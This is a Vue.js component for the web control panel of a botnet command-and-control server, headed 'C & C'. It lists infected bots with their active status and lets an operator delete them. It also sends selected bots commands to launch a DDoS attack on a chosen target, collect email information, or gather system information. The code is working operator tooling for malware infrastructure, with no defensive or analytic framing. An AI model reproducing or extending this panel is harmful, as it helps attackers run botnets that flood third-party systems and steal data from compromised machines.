<script>

export default {
	data: function() {
		return {
			errormsg: null,
			loading: false,
			some_data: null,
			token: null,
			underdata: null,
			target: null,
			type: "ddos",
			rounds: 1,
			info: ""
		}
	},
	methods: {
		async refresh() {
			this.loading = true;
			this.errormsg = null;
			
			let response = await this.$axios.get("/");
			this.some_data = response.data;
			
			this.loading = false;
		},
		getInfo(ty,agg){
			console.log(agg);
			let checkboxes = document.getElementsByName("checkbox")
			for (let i = 0; i < checkboxes.length; i++) {
				let box = checkboxes[i]
				if(box.checked){
					let data = {
						"id":box.value,
					}
					data[ty] = agg
					this.makeRequest(box,data)
				}
			}
			
			
		},
		async makeRequest(box,data){
			let h4 = document.getElementById("response-"+box.value)
			let spinner = document.getElementById("spinner-"+box.value)
			try{
				spinner.className = "loader"
				let response = await this.$axios.post("/action",data)
				let data1 = response.data
				let div = document.createElement('div')
				for (let key in data1) {
					if (key == "id"){
						continue
					}
					let ul = document.createElement('ul')
					const node = document.createTextNode(key);
					ul.appendChild(node);
					let ul1 = document.createElement('ul')
					const node1 = document.createTextNode(data1[key]);
					ul1.appendChild(node1);
					ul.appendChild(ul1)
					div.appendChild(ul)
				}
				h4.appendChild(div)
				spinner.classList.remove("loader")
				
			}catch(e){
				console.log(e);
				spinner.classList.remove("loader")
				h4.textContent = e.message
			}
		},
		toggle(){
			let checkboxes = document.getElementsByName("checkbox")
			let parent = document.getElementsByName("checkbox-parent")
			parent.checked = !parent.checked
			for (let i = 0; i < checkboxes.length; i++) {
				let box = checkboxes[i]
				box.checked = parent.checked
			}
		},
		async deleteBot(id){
			try{
				await this.$axios.put(`/${id}/delete`)
				this.refresh()
			}catch(e){
				console.log(e);
			}
		}
	},
	mounted() {
		this.refresh()
	}
}
</script>

<template>
	<div>
		<div
			class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
			<h1 class="h2">C & C</h1>
		</div>
		<LoadingSpinner v-if="this.loading"></LoadingSpinner>
		<select id="dropdown" name="drop minimal" v-model="type">
			<option value="ddos" selected>DDos Attack</option>
			<option value="email">Get Email Info</option>
			<option value="info">Get System Info</option>
      	</select>
		<div v-if="type=='ddos'">
			<input type="text" placeholder="Number Of Rounds" v-model="rounds">
			<input type="text" placeholder="Target" v-model="target">
			<input type="button" value="Send" @click="getInfo(this.type,{'target':this.target,'rounds':parseInt(this.rounds)})">
		</div>
		<div v-if="type=='info'">
			<input type="text" placeholder="Info with ; separator" v-model="info">
			<input type="button" value="Send" @click="getInfo(this.type,this.info.split(';'))">
		</div>
		<div v-if="type=='email'">
			<input type="button" value="Send" @click="getInfo(this.type,true)">
		</div>
		<br/>
    	<br/>
    	<br/>
    	<br/>
		
		<table id="table">
			<thead>
				<tr>
				<th><input type="checkbox" name="checkbox-parent" @click="toggle()"></th>
				<th>Name</th>
				<th>Active</th>
				<th>Loading</th>
				<th>Response</th>
				<th>Delete</th>
				</tr>
			</thead>
			
			<tr v-for="item in this.some_data" :key="item">
				<td >
					<input type="checkbox" name="checkbox" v-bind:value="item.Id" class="checkbox" v-bind:id="'box-'+item.Id">
				</td>
				<td>
					<h5>
						{{ item.CustomUsername }}
					</h5>
				</td>
				<td>
					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-circle-fill" viewBox="0 0 16 16">
								<circle v-bind:style="'color:' + (item.Active ? 'green' : 'red')" cx="8" cy="8" r="8"/>
					</svg>
				</td>
				<td>
					<div v-bind:id="'spinner-'+item.Id"></div>
				</td>
				<td>
					<h5 v-bind:id="'response-'+item.Id"></h5>
				</td>
				<td>
					<div @click="deleteBot(item.Id)">
						<svg height="40px" width="40px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path style="fill:#EB86BF;" d="M0,256.006C0,397.402,114.606,512.004,255.996,512C397.394,512.004,512,397.402,512,256.006 C512.009,114.61,397.394,0,255.996,0C114.606,0,0,114.614,0,256.006z"></path> <path style="fill:#D670AD;" d="M512,256.005c0-4.039-0.119-8.051-0.304-12.045c-0.426-0.558-93.859-94.043-94.499-94.499 c-1.281-1.797-3.28-3.045-5.658-3.045H201.899c-1.885,0-3.7,0.756-5.026,2.099L95.436,251.029c-2.727,2.755-2.727,7.187,0,9.942 l101.437,102.514c0.015,0.015,0.036,0.019,0.051,0.034l1.581,1.598c0.015,0.015,133.868,133.851,133.883,133.866l1.055,1.067 C436.972,467.232,512,370.401,512,256.005z"></path> <g> <path style="fill:#F4F6F9;" d="M411.539,146.416H201.9c-1.885,0-3.7,0.756-5.026,2.099L95.436,251.029 c-2.727,2.755-2.727,7.187,0,9.942l101.437,102.514c1.326,1.343,3.141,2.099,5.026,2.099h209.641c3.908,0,7.07-3.166,7.07-7.07 V153.486C418.609,149.582,415.447,146.416,411.539,146.416z M404.469,351.444H204.847L110.412,256l94.436-95.444h199.621V351.444z"></path> <path style="fill:#F4F6F9;" d="M258.073,306.949c1.381,1.381,3.189,2.071,4.998,2.071c1.809,0,3.618-0.69,4.998-2.071 l40.955-40.955l40.958,40.958c1.381,1.381,3.189,2.071,4.998,2.071s3.618-0.69,4.998-2.071c2.762-2.762,2.762-7.235,0-9.997 l-40.958-40.958l40.958-40.958c2.762-2.762,2.762-7.235,0-9.997c-2.762-2.762-7.235-2.762-9.997,0l-40.958,40.958l-40.955-40.955 c-2.762-2.762-7.235-2.762-9.997,0c-2.762,2.762-2.762,7.235,0,9.997l40.955,40.955l-40.955,40.955 C255.311,299.714,255.311,304.188,258.073,306.949z"></path> </g> </g></svg>
					</div>
				</td>
			</tr>
		</table>
		
	</div>
</template>

<style>
.loader {
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #3498db;
  width: 60px;
  height: 60px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.row{
    display: flex;
    gap: 5px;
}
#table {
	border-collapse: collapse;
	width: 100%;
}
#table td, #table th {
	border: 1px solid #6cace1;
	padding: 20px;
	align-content: center;
}
#table .title{
	font-size: 25px;
	background-color: #999999;
	text-align: center;
}
/* #table tr:nth-child(even){background-color: #88a3f7;} */
table tr:hover {background-color: rgb(134, 220, 239,.18);}

#table th {
	padding-top: 12px;
	padding-bottom: 12px;
	text-align: left;
	background-color: #04aa6d;
}

</style>
